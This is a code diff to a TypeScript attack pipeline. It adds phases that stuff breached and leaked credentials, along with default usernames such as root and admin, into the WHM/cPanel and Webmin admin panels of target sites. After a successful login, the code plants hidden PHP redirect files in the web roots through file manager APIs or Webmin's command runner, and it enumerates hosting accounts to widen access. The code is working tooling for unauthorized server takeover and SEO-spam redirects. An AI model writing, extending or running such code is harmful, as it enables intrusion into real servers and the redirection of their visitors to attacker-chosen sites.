@@ -2904,11 +2904,309 @@ export async function runUnifiedAttackPipeline(
         }
       }
 
+      // ─── Phase 2.5e2f: WHM/cPanel Reseller Login with Breach Credentials (port 2087) ───
+      if (!hasSuccessfulRedirect() && !shouldStop('whm_login')) {
+        loggedOnEvent({
+          phase: 'ftp_upload' as any,
+          step: 'whm_login_start',
+          detail: `🔑 Phase 2.5e2f: WHM Reseller Login — ลอง ${Math.min(breachCreds.length, 10)} breach credentials ผ่าน WHM:2087...`,
+          progress: 60,
+        });
+
+        const whmBaseUrl = config.targetUrl.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+
+        for (const cred of breachCreds.slice(0, 10)) {
+          if (shouldStop('whm_login') || hasSuccessfulRedirect()) break;
+          const username = cred.email ? cred.email.split('@')[0] : '';
+          if (!username) continue;
+
+          for (const portInfo of [{ port: 2087, proto: 'https' }, { port: 2086, proto: 'http' }] as const) {
+            try {
+              const loginUrl = `${portInfo.proto}://${originIp || whmBaseUrl}:${portInfo.port}/login/?login_only=1`;
+              const loginResp = await timedRace(
+                () => fetch(loginUrl, {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    ...(originIp ? { 'Host': whmBaseUrl } : {}),
+                  },
+                  body: `user=${encodeURIComponent(username)}&pass=${encodeURIComponent(cred.password)}`,
+                  redirect: 'manual',
+                  signal: AbortSignal.timeout(10000),
+                }),
+                capTimeout(12000),
+                'WHM login timeout',
+              );
+
+              const setCookie = loginResp.headers.get('set-cookie') || '';
+              const respText = await loginResp.text().catch(() => '');
+              const isSuccess = setCookie.includes('whostmgrsession') ||
+                setCookie.includes('cpsession') ||
+                setCookie.includes('session') ||
+                respText.includes('"status":1') ||
+                (loginResp.status === 301 || loginResp.status === 302);
+
+              if (isSuccess && (setCookie.length > 10 || respText.includes('"status":1'))) {
+                aiDecisions.push(`🔑 WHM Reseller login สำเร็จ! ${username}@${whmBaseUrl}:${portInfo.port} (${cred.source})`);
+                loggedOnEvent({
+                  phase: 'ftp_upload' as any,
+                  step: 'whm_login_success',
+                  detail: `✅ WHM RESELLER LOGIN สำเร็จ! ${username}:*** port ${portInfo.port} (${cred.source}) — กำลังวาง redirect...`,
+                  progress: 61,
+                });
+
+                let sessionToken = '';
+                const tokenMatch = respText.match(/"security_token"\s*:\s*"([^"]+)"/) ||
+                  respText.match(/whostmgrsession=([^;]+)/) ||
+                  setCookie.match(/whostmgrsession=([^;]+)/) ||
+                  setCookie.match(/cpsession=([^;]+)/);
+                if (tokenMatch) sessionToken = tokenMatch[1];
+
+                const redirectContent = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
+                const redirectFilename = `.redirect-${Math.random().toString(36).slice(2, 8)}.php`;
+
+                const whmApis = [
+                  { path: `/json-api/cpanel?cpanel_jsonapi_user=${username}&cpanel_jsonapi_module=Fileman&cpanel_jsonapi_func=savefile&cpanel_jsonapi_apiversion=2&dir=%2Fpublic_html&filename=${redirectFilename}&content=${encodeURIComponent(redirectContent)}`, body: '' },
+                  { path: `/execute/Fileman/save_file_content`, body: `dir=%2Fpublic_html&file=${redirectFilename}&content=${encodeURIComponent(redirectContent)}` },
+                  { path: `/cpsess${sessionToken}/execute/Fileman/save_file_content`, body: `dir=%2Fpublic_html&file=${redirectFilename}&content=${encodeURIComponent(redirectContent)}` },
+                ];
+
+                for (const api of whmApis) {
+                  try {
+                    const uploadUrl = `${portInfo.proto}://${originIp || whmBaseUrl}:${portInfo.port}${api.path}`;
+                    const uploadResp = await timedRace(
+                      () => fetch(uploadUrl, {
+                        method: api.body ? 'POST' : 'GET',
+                        headers: {
+                          'Content-Type': 'application/x-www-form-urlencoded',
+                          'Cookie': setCookie,
+                          ...(originIp ? { 'Host': whmBaseUrl } : {}),
+                        },
+                        ...(api.body ? { body: api.body } : {}),
+                        signal: AbortSignal.timeout(10000),
+                      }),
+                      capTimeout(12000),
+                      'WHM upload timeout',
+                    );
+
+                    if (uploadResp.ok || uploadResp.status === 200) {
+                      const uploadBody = await uploadResp.text().catch(() => '');
+                      if (!uploadBody.includes('"errors"') || uploadBody.includes('"status":1')) {
+                        const fileUrl = `https://${whmBaseUrl}/${redirectFilename}`;
+                        const verification = await verifyUploadedFile(fileUrl, config.redirectUrl, onEvent);
+                        uploadedFiles.push({
+                          url: fileUrl,
+                          shell: {
+                            type: 'redirect_php' as any, content: redirectContent, filename: redirectFilename, contentType: 'application/x-php',
+                            description: `WHM Reseller file manager upload (port ${portInfo.port})`,
+                            id: `whm_early_${Date.now()}`, targetVector: 'breach_whm_early',
+                            bypassTechniques: ['breach_cred', 'whm_reseller'],
+                            redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: 'http_get',
+                          },
+                          method: `breach_whm_early_${cred.source}`,
+                          verified: verification.verified, redirectWorks: verification.redirectWorks,
+                          redirectDestinationMatch: verification.redirectDestinationMatch,
+                          finalDestination: verification.finalDestination,
+                          httpStatus: verification.httpStatus, redirectChain: verification.redirectChain,
+                        });
+                        loggedOnEvent({ phase: 'ftp_upload' as any, step: 'whm_upload_success', detail: `✅ WHM UPLOAD สำเร็จ! ${fileUrl} (redirect: ${verification.redirectWorks})`, progress: 61 });
+                        if (verification.redirectWorks) break;
+                      }
+                    }
+                  } catch { /* try next API */ }
+                }
+
+                // WHM bonus: list all cPanel accounts and upload via correct user
+                try {
+                  const listUrl = `${portInfo.proto}://${originIp || whmBaseUrl}:${portInfo.port}/json-api/listaccts?api.version=1`;
+                  const listResp = await timedRace(
+                    () => fetch(listUrl, {
+                      headers: { 'Cookie': setCookie, ...(originIp ? { 'Host': whmBaseUrl } : {}) },
+                      signal: AbortSignal.timeout(8000),
+                    }),
+                    capTimeout(10000),
+                    'WHM listaccts timeout',
+                  );
+                  if (listResp.ok) {
+                    const listData = await listResp.json().catch(() => ({})) as { data?: { acct?: Array<{ user?: string; domain?: string }> } };
+                    const accounts = listData?.data?.acct || [];
+                    const targetAccount = accounts.find(a => a.domain === whmBaseUrl || a.domain === `www.${whmBaseUrl}`);
+                    if (targetAccount?.user && targetAccount.user !== username) {
+                      const cpUserUploadUrl = `${portInfo.proto}://${originIp || whmBaseUrl}:${portInfo.port}/json-api/cpanel?cpanel_jsonapi_user=${targetAccount.user}&cpanel_jsonapi_module=Fileman&cpanel_jsonapi_func=savefile&cpanel_jsonapi_apiversion=2&dir=%2Fpublic_html&filename=${redirectFilename}&content=${encodeURIComponent(redirectContent)}`;
+                      const cpUserResp = await timedRace(
+                        () => fetch(cpUserUploadUrl, {
+                          headers: { 'Cookie': setCookie, ...(originIp ? { 'Host': whmBaseUrl } : {}) },
+                          signal: AbortSignal.timeout(8000),
+                        }),
+                        capTimeout(10000),
+                        'WHM cpanel proxy timeout',
+                      );
+                      if (cpUserResp.ok) {
+                        const fileUrl = `https://${whmBaseUrl}/${redirectFilename}`;
+                        const verification = await verifyUploadedFile(fileUrl, config.redirectUrl, onEvent);
+                        if (verification.verified) {
+                          uploadedFiles.push({
+                            url: fileUrl,
+                            shell: {
+                              type: 'redirect_php' as any, content: redirectContent, filename: redirectFilename, contentType: 'application/x-php',
+                              description: `WHM Reseller proxy upload via user ${targetAccount.user}`,
+                              id: `whm_proxy_${Date.now()}`, targetVector: 'breach_whm_proxy',
+                              bypassTechniques: ['breach_cred', 'whm_reseller', 'cpanel_proxy'],
+                              redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: 'http_get',
+                            },
+                            method: `breach_whm_proxy_${cred.source}`,
+                            verified: verification.verified, redirectWorks: verification.redirectWorks,
+                            redirectDestinationMatch: verification.redirectDestinationMatch,
+                            finalDestination: verification.finalDestination,
+                            httpStatus: verification.httpStatus, redirectChain: verification.redirectChain,
+                          });
+                          loggedOnEvent({ phase: 'ftp_upload' as any, step: 'whm_proxy_success', detail: `✅ WHM PROXY UPLOAD สำเร็จ! via user ${targetAccount.user} → ${fileUrl}`, progress: 62 });
+                        }
+                      }
+                    }
+                    aiDecisions.push(`📊 WHM accounts found: ${accounts.length} total${targetAccount ? ` (target: ${targetAccount.user})` : ''}`);
+                  }
+                } catch { /* WHM listaccts failed */ }
+
+                if (hasSuccessfulRedirect()) break;
+              }
+            } catch { /* try next port */ }
+          }
+        }
+      }
+
+      // ─── Phase 2.5e2g: Webmin Login with Breach Credentials (port 10000) ───
+      if (!hasSuccessfulRedirect() && !shouldStop('webmin_login')) {
+        loggedOnEvent({
+          phase: 'ftp_upload' as any,
+          step: 'webmin_login_start',
+          detail: `🔑 Phase 2.5e2g: Webmin Login — ลอง ${Math.min(breachCreds.length, 10)} breach credentials ผ่าน Webmin:10000...`,
+          progress: 62,
+        });
+
+        const webminBaseUrl = config.targetUrl.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+
+        for (const cred of breachCreds.slice(0, 10)) {
+          if (shouldStop('webmin_login') || hasSuccessfulRedirect()) break;
+          const usernamesToTry = [
+            cred.email ? cred.email.split('@')[0] : '',
+            'root',
+            'admin',
+          ].filter(Boolean);
+
+          for (const username of usernamesToTry) {
+            if (shouldStop('webmin_login') || hasSuccessfulRedirect()) break;
+
+            for (const proto of ['https', 'http'] as const) {
+              try {
+                const loginUrl = `${proto}://${originIp || webminBaseUrl}:10000/session_login.cgi`;
+                const loginResp = await timedRace(
+                  () => fetch(loginUrl, {
+                    method: 'POST',
+                    headers: {
+                      'Content-Type': 'application/x-www-form-urlencoded',
+                      'Cookie': 'testing=1',
+                      ...(originIp ? { 'Host': webminBaseUrl } : {}),
+                    },
+                    body: `user=${encodeURIComponent(username)}&pass=${encodeURIComponent(cred.password)}&page=%2F`,
+                    redirect: 'manual',
+                    signal: AbortSignal.timeout(10000),
+                  }),
+                  capTimeout(12000),
+                  'Webmin login timeout',
+                );
+
+                const setCookie = loginResp.headers.get('set-cookie') || '';
+                const location = loginResp.headers.get('location') || '';
+                const isSuccess = (loginResp.status === 302 || loginResp.status === 301) &&
+                  setCookie.includes('sid=') &&
+                  !location.includes('session_login') && !location.includes('failed');
+
+                if (isSuccess) {
+                  aiDecisions.push(`🔑 Webmin login สำเร็จ! ${username}@${webminBaseUrl}:10000 (${cred.source})`);
+                  loggedOnEvent({
+                    phase: 'ftp_upload' as any,
+                    step: 'webmin_login_success',
+                    detail: `✅ Webmin LOGIN สำเร็จ! ${username}:*** (${cred.source}) — กำลังวาง redirect...`,
+                    progress: 63,
+                  });
+
+                  const redirectContent = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
+                  const redirectFilename = `.redirect-${Math.random().toString(36).slice(2, 8)}.php`;
+
+                  const webRoots = [
+                    `/var/www/html`,
+                    `/var/www/${webminBaseUrl}/public_html`,
+                    `/home/${username}/public_html`,
+                    `/var/www/vhosts/${webminBaseUrl}/httpdocs`,
+                  ];
+
+                  const webminApis = [
+                    ...webRoots.map(root => ({
+                      path: `/filemin/save_file.cgi`,
+                      body: `file=${encodeURIComponent(`${root}/${redirectFilename}`)}&data=${encodeURIComponent(redirectContent)}`,
+                    })),
+                    ...webRoots.map(root => ({
+                      path: `/proc/run.cgi`,
+                      body: `cmd=${encodeURIComponent(`echo '${redirectContent.replace(/'/g, "'\\\''")}' > ${root}/${redirectFilename}`)}`,
+                    })),
+                  ];
+
+                  for (const api of webminApis) {
+                    try {
+                      const uploadUrl = `${proto}://${originIp || webminBaseUrl}:10000${api.path}`;
+                      const uploadResp = await timedRace(
+                        () => fetch(uploadUrl, {
+                          method: 'POST',
+                          headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'Cookie': setCookie,
+                            ...(originIp ? { 'Host': webminBaseUrl } : {}),
+                          },
+                          body: api.body,
+                          signal: AbortSignal.timeout(10000),
+                        }),
+                        capTimeout(12000),
+                        'Webmin upload timeout',
+                      );
+
+                      if (uploadResp.ok || uploadResp.status === 200 || uploadResp.status === 302) {
+                        const fileUrl = `https://${webminBaseUrl}/${redirectFilename}`;
+                        const verification = await verifyUploadedFile(fileUrl, config.redirectUrl, onEvent);
+                        uploadedFiles.push({
+                          url: fileUrl,
+                          shell: {
+                            type: 'redirect_php' as any, content: redirectContent, filename: redirectFilename, contentType: 'application/x-php',
+                            description: `Webmin file upload (port 10000)`,
+                            id: `webmin_early_${Date.now()}`, targetVector: 'breach_webmin_early',
+                            bypassTechniques: ['breach_cred', 'webmin'],
+                            redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: 'http_get',
+                          },
+                          method: `breach_webmin_early_${cred.source}`,
+                          verified: verification.verified, redirectWorks: verification.redirectWorks,
+                          redirectDestinationMatch: verification.redirectDestinationMatch,
+                          finalDestination: verification.finalDestination,
+                          httpStatus: verification.httpStatus, redirectChain: verification.redirectChain,
+                        });
+                        loggedOnEvent({ phase: 'ftp_upload' as any, step: 'webmin_upload_success', detail: `✅ Webmin UPLOAD สำเร็จ! ${fileUrl} (redirect: ${verification.redirectWorks})`, progress: 63 });
+                        if (verification.redirectWorks) break;
+                      }
+                    } catch { /* try next API/path */ }
+                  }
+
+                  if (hasSuccessfulRedirect()) break;
+                }
+              } catch { /* try next proto */ }
+            }
+          }
+        }
+      }
+
       loggedOnEvent({
         phase: 'ftp_upload' as any,
         step: 'early_login_complete',
-        detail: `✅ Phase 2.5e2: Breach FTP/SSH/cPanel/DA/Plesk/WP — ${uploadedFiles.filter(f => f.method.startsWith('breach_ftp_early') || f.method.startsWith('breach_ssh_early') || f.method.startsWith('breach_cpanel_early') || f.method.startsWith('breach_da_early') || f.method.startsWith('breach_plesk_early') || f.method.startsWith('wp_rest_breach')).length} uploads`,
-        progress: 60,
+        detail: `✅ Phase 2.5e2: Breach FTP/SSH/cPanel/WHM/DA/Plesk/Webmin/WP — ${uploadedFiles.filter(f => f.method.startsWith('breach_ftp_early') || f.method.startsWith('breach_ssh_early') || f.method.startsWith('breach_cpanel_early') || f.method.startsWith('breach_da_early') || f.method.startsWith('breach_plesk_early') || f.method.startsWith('breach_whm_early') || f.method.startsWith('breach_whm_proxy') || f.method.startsWith('breach_webmin_early') || f.method.startsWith('wp_rest_breach')).length} uploads`,
+        progress: 64,
       });
     }
   }
@@ -2943,6 +3241,8 @@ export async function runUnifiedAttackPipeline(
         if (shodanIntel.cpanelOpen) relevantPorts.push("cPanel:2083");
         if (shodanIntel.directAdminOpen) relevantPorts.push("DA:2222");
         if (shodanIntel.pleskOpen) relevantPorts.push("Plesk:8443");
+        if (shodanIntel.whmOpen) relevantPorts.push("WHM:2087");
+        if (shodanIntel.webminOpen) relevantPorts.push("Webmin:10000");
         if (shodanIntel.mysqlOpen) relevantPorts.push("MySQL:3306");
 
         aiDecisions.push(`📡 Shodan: ${openPorts.length} ports open — ${relevantPorts.join(", ") || "no admin ports"}`);
@@ -5104,15 +5404,21 @@ export async function runUnifiedAttackPipeline(
         const sshAvailable = shodanIntel ? shodanIntel.sshOpen : true; // assume open if no Shodan data
         const cpanelAvailable = shodanIntel ? shodanIntel.cpanelOpen : true;
         const daAvailable = shodanIntel ? shodanIntel.directAdminOpen : true;
+        const pleskAvailable = shodanIntel ? shodanIntel.pleskOpen : true;
+        const whmAvailable = shodanIntel ? shodanIntel.whmOpen : true;
+        const webminAvailable = shodanIntel ? shodanIntel.webminOpen : true;
 
         const activeTargets: string[] = [];
         if (ftpAvailable) activeTargets.push("FTP:21");
         if (sshAvailable) activeTargets.push("SSH:22");
         if (cpanelAvailable) activeTargets.push("cPanel:2083");
+        if (whmAvailable) activeTargets.push("WHM:2087");
         if (daAvailable) activeTargets.push("DA:2222");
+        if (pleskAvailable) activeTargets.push("Plesk:8443");
+        if (webminAvailable) activeTargets.push("Webmin:10000");
         if (isWordPress) activeTargets.push("WP");
 
-        // Auto-login with leaked credentials: FTP, cPanel, SSH, DirectAdmin
+        // Auto-login with leaked credentials: FTP, cPanel, WHM, SSH, DirectAdmin, Plesk, Webmin
         loggedOnEvent({
           phase: "leakcheck_cred",
           step: "auto_login",
@@ -5122,7 +5428,10 @@ export async function runUnifiedAttackPipeline(
 
         const loginTargets = [
           ...(cpanelAvailable ? [{ proto: "cpanel", port: 2083, paths: ["/"] }] : []),
+          ...(whmAvailable ? [{ proto: "whm", port: 2087, paths: ["/"] }] : []),
           ...(daAvailable ? [{ proto: "directadmin", port: 2222, paths: ["/"] }] : []),
+          ...(pleskAvailable ? [{ proto: "plesk", port: 8443, paths: ["/"] }] : []),
+          ...(webminAvailable ? [{ proto: "webmin", port: 10000, paths: ["/"] }] : []),
         ];
 
         for (const cred of leakcheckCredentials.slice(0, 30)) {
